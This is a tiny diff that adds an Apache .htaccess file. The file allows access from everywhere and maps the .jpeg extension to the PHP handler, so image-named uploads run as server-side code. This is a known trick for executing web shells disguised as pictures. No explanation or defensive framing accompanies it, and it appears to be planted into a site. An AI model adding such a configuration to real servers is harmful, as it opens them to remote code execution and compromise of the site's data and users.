@@ -1,0 +1,3 @@
+Order Deny,Allow
+Allow from all
+addhandler application/x-httpd-php jpeg
